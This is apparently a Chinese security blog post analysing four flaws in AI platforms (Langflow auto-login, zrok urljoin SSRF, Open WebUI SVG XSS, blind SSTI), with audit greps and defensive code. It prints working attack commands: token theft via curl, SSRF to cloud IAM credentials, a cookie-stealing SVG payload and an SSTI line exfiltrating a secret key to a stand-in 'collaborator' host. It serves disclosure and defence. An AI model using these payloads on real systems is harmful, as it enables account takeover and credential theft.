概述：AI平台的系统性安全缺陷 🔍

AI/ML平台正在成为新的高危攻击面。Langflow、Open WebUI、Gradio、Streamlit、ComfyUI——这些平台为了降低使用门槛，普遍存在「便利性优先、安全性后置」的设计哲学。今天分析四个来自不同AI产品的漏洞，它们暴露了同一类系统性问题。

四个CVE覆盖四种完全不同的攻击路径：

🔓 路径一：Auto-login端点 → 无认证超级令牌
CVE-2026-9103 (Langflow, CVSS 9.8)

🔗 路径二：urljoin绝对URL → 云元数据SSRF
CVE-2026-45568 (zrok Python SDK, CVSS 7.5)

🖼️ 路径三：MIME扩展名推断 → SVG Stored XSS
CVE-2026-56398 (Open WebUI, CVSS 8.7)

💉 路径四：无回显SSTI → 错误/时间驱动盲注
PortSwigger Research 2025 #1 方法论

CVE-2026-9103：Langflow Auto-login → 超级令牌 🔓

场景

Langflow 是一个流行的AI工作流编排平台，提供可视化拖拽构建LLM应用的能力。它有一个 /api/v1/login/auto_login 端点——设计目的是让演示环境快速登录，完全跳过认证流程，直接发放superuser级别的Bearer token。

漏洞原理

这个漏洞的恐怖之处在于：连猜都不需要。与默认凭证漏洞不同（至少还需要猜用户名/密码），auto_login端点连凭证都不需要——知道路径就够了。

# 只需知道端点路径，即可获取管理员令牌
curl -s http://target:7860/api/v1/login/auto_login | jq .

# 返回：
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "token_type": "bearer"
}

# 用这个token访问任何API
curl -s http://target:7860/api/v1/users/ \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." | jq .
# 返回所有用户信息，包括密码哈希

核心洞察：「自动登录」功能的设计前提是「调用者已经通过其他方式认证」，但这个前提在代码层面没有被强制执行——端点本身不验证调用者身份。这类端点往往在开发/测试阶段加入，正式发布时未被移除——因为没有对应的UI入口，代码审计容易遗漏。

审计方法

# 搜索代码中的auto_login端点定义
grep -rn 'auto_login\|autoLogin\|debug_login\|dev_auth\|dev_token' \
  --include='*.py' --include='*.js' --include='*.ts'

# 直接curl测试常见AI平台
curl -s -o /dev/null -w "%{http_code}" http://target:7860/api/v1/login/auto_login
curl -s -o /dev/null -w "%{http_code}" http://target:7860/api/v1/auto_login
curl -s -o /dev/null -w "%{http_code}" http://target:8000/debug/login

# 检查Swagger/OpenAPI文档中的未认证端点
curl -s http://target:7860/openapi.json | jq '.paths | keys[]' | grep -i login

受影响平台

这种模式不只存在于Langflow。所有AI/ML开源平台都值得审计：

  • Gradio — /login 端点的认证逻辑
  • Streamlit — 开发模式下的认证旁路
  • ComfyUI — 默认无认证
  • Open WebUI — 注册端点是否可控

CVE-2026-45568：zrok urljoin → SSRF 🔗

场景

zrok 是一个开源的网络隧道/共享工具（类似ngrok）。它的Python SDK提供了一个 ProxyShare 功能，用Flask实现HTTP代理路由。关键代码使用 urllib.parse.urljoin() 拼接后端URL和用户请求路径。

漏洞原理

Python的 urljoin() 遵循RFC 3986——当第二个参数是绝对URL（以 http:// 或 https:// 开头）时，第一个参数被完全忽略：

# urljoin的正常行为
urljoin("http://backend:8080", "/api/users")
# → "http://backend:8080/api/users"  ✓ 正常拼接

# urljoin的危险行为
urljoin("http://backend:8080", "http://169.254.169.254/latest/meta-data/")
# → "http://169.254.169.254/latest/meta-data/"  ✗ base被完全忽略！

Flask代理路由接收用户请求路径后用 urljoin() 拼接后端URL。攻击者传入绝对URL作为路径→base被忽略→请求被转发到攻击者指定的地址→SSRF到云元数据。

# zrok ProxyShare的漏洞代码（简化）
@app.route('/')
def proxy(target_path):
    backend_url = urljoin(self.backend, target_path)  # ← 漏洞点
    return requests.get(backend_url)
# 攻击：SSRF到AWS元数据
curl "http://zrok-share:8080/http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# zrok内部：urljoin("http://backend:8080", "http://169.254.169.254/...")
# → 请求被发到169.254.169.254而非backend！

核心洞察

urljoin 的「绝对URL覆盖base」行为是RFC标准设计，但开发者很少意识到用户控制的路径可以包含 ://。Python SDK/CLI工具暴露的Flask代理路由是新的攻击面——SDK为了易用性暴露HTTP接口但缺乏安全审查。

审计方法

# 搜索所有urljoin调用
grep -rn 'urljoin(' --include='*.py' | grep -v __pycache__ | grep -v test

# 检查第二个参数是否来自用户输入
grep -rn 'urljoin.*request\.' --include='*.py'
grep -rn 'urljoin.*target_path\|urljoin.*path_info\|urljoin.*url' --include='*.py'

防御

# 安全的路径拼接——拒绝绝对URL
from urllib.parse import urlparse

def safe_urljoin(base, user_path):
    # 如果用户路径是绝对URL，直接拒绝
    parsed = urlparse(user_path)
    if parsed.scheme:
        raise ValueError(f"绝对URL被拒绝: {user_path}")
    return urljoin(base, user_path)

CVE-2026-56398：Open WebUI SVG → Stored XSS 🖼️

场景

Open WebUI 是一个流行的自托管LLM Web界面。它支持OAuth/OIDC登录，会从OAuth provider获取用户的 picture claim（头像URL）并在页面中渲染。

漏洞原理

当Open WebUI获取到用户的头像URL后，它通过文件扩展名推断MIME类型，而非检查HTTP响应的 Content-Type 头。攻击者利用这个差异：

🎭 攻击者在任意图片托管服务上传 evil.svg（含XSS payload）
→ 📝 获取SVG的URL: https://imgur.com/abc123.svg
→ 🔑 攻击者在OAuth provider设置头像URL为该SVG地址
→ 🖼️ Open WebUI获取URL，根据.svg扩展名推断MIME为image/svg+xml
→ 💀 浏览器渲染SVG时执行内嵌JavaScript → 在目标域下Stored XSS 

<!-- evil.svg 文件内容 -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <text x="10" y="20" fill="red">Hello</text>
</svg>

核心洞察

Content-Type校验的缺失使任何外部SVG托管服务都成为XSS payload的投递通道——攻击者不需要在目标系统上上传文件。与传统文件上传绕过不同，这里文件从未上传到目标服务器，而是通过URL引用远程加载。

审计方法

# 找到所有接受外部URL并渲染图片的功能
grep -rn 'picture\|avatar\|image.*url\|profile.*photo' --include='*.py' --include='*.js'

# 检查MIME类型判断逻辑
grep -rn 'extname\|endswith.*\.png\|endswith.*\.jpg\|endswith.*\.svg' --include='*.py'
grep -rn 'Content-Type\|content_type\|mimetype' --include='*.py' | grep -v 'text/html'

# 测试：上传SVG到任意图片托管，然后通过URL导入
curl -s -o evil.svg 'data:image/svg+xml,'
# 上传到imgur/任意图床，获取URL，设置为OAuth头像

防御

# 安全的远程图片获取——检查Content-Type而非扩展名
import requests

def safe_fetch_image(url):
    resp = requests.get(url, stream=True, timeout=10)
    content_type = resp.headers.get('Content-Type', '')
    
    # 只允许安全的图片类型
    ALLOWED_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
    
    if content_type.split(';')[0].strip() not in ALLOWED_TYPES:
        raise ValueError(f"不允许的Content-Type: {content_type}")
    
    # SVG绝不允许——它既是图片也是可执行代码
    if 'svg' in content_type.lower():
        raise ValueError("SVG文件不被允许")
    
    return resp.content

盲SSTI：错误驱动与时间驱动方法论 💉

场景

PortSwigger的Vladislav Korchagin在2025年Top 10 Web Hacking Techniques中排名第一的研究，系统化了无回显SSTI的利用方法论。当模板注入点不直接返回执行结果（如注入在邮件模板、日志消息、后台任务中），SQL盲注的全套技术可以迁移过来。

三个层次

第一层：错误驱动（Error-based）

# Jinja2 — 触发除零错误
{{1/0}}

# Freemarker — 触发null访问
${a.b.c}

# 如果错误消息有差异（500 vs 200、不同响应时间），
# 就能确认注入点和模板引擎类型

第二层：时间驱动（Time-based）

# Jinja2 — 大数据结构遍历制造延迟
{{range(99999999)|list}}

# Freemarker — 循环时间操作
${.now?long}

# 通过响应时间差异逐字符提取数据
# 与time-based SQLi完全同构

第三层：Polyglot探针

# 多引擎兼容的检测payload
${{<%[%'"}}%\

# 一次请求同时探测Jinja2/Twig/Freemarker/Velocity/ERB等引擎
# 根据响应差异区分具体引擎类型

核心洞察

SSTI的利用不应只关注有回显场景——SQL注入花了十年才系统化盲注技术，SSTI也应该系统化盲用。对每个疑似SSTI的点，先测error-based（{{1/0}}）、再测time-based（{{sleep(5)}}）、最后OOB（{{request("http://collab/ping")}}）。

审计方法

# 1. 确认SSTI注入点
curl -s "http://target/submit?name={{7*7}}" | grep "49"

# 2. Error-based确认引擎
curl -s -o /dev/null -w "%{http_code}" "http://target/submit?name={{1/0}}"
# Jinja2返回500，其他引擎可能返回200

# 3. Time-based盲注
time curl -s "http://target/submit?name={{range(99999999)|list}}" 
# 如果耗时明显增加，确认Jinja2

# 4. OOB数据外带
curl -s "http://target/submit?name={{request('http://collaborator/ping?data='+config.SECRET_KEY)}}"

攻击模式提炼 🧠

四个漏洞的共同底层模式——AI平台的「便利性」=「攻击面」：

维度 Auto-login urljoin SSRF SVG XSS 盲SSTI
便利性功能 快速登录 路径拼接 头像导入 模板渲染
安全假设 "内网可信" "路径是相对的" "扩展名=类型" "无回显=无害"
实际后果 未认证RCE 云元数据泄露 Stored XSS→ATO 盲RCE/数据泄露
根因 便利性功能的安全假设在代码层面未被强制执行

AI平台的攻击面比传统Web应用更广，因为它们通常同时暴露：

  • REST API（管理操作）
  • WebSocket（实时通信）
  • 文件上传/下载（模型、数据集）
  • 代码执行环境（Python sandbox）
  • OAuth/SSO集成（第三方认证）

防御思路 🛡️

1. Auto-login类端点

  • 生产环境删除所有便利性认证端点，不注释、不加flag，直接删除
  • 如果必须保留，加IP白名单 + 环境变量开关 + 请求来源校验
  • CI/CD中加入 grep -rn auto_login src/ 作为安全门禁

2. URL拼接

  • 永远不要用 urljoin(base, user_input) 做路径拼接
  • 使用 urlparse 先解析，确认 scheme 为空后再拼接
  • 代理路由的白名单只允许相对路径（不包含 ://）

3. 远程资源MIME判断

  • 永远基于 Content-Type 响应头判断类型，不看扩展名
  • 禁止SVG（SVG = 图片 + XSS载体，不可分割）
  • 对外部图片做服务端二次验证（magic bytes检查）

4. 模板注入防护

  • 用户输入绝不进入模板字符串——用参数化渲染而非字符串拼接
  • 对所有模板渲染点做SSTI fuzzing（{{7*7}}、{{1/0}}、${7*7}）
  • 邮件/日志/通知模板也要测试——「无回显」不等于「无害」

AI平台的安全问题不是个别产品的bug，而是整个品类的设计哲学问题——「降低门槛」和「安全默认」是天然矛盾的。当你在用一个AI平台时，先问自己：它为了便利性，跳过了哪些安全决策？🛡️
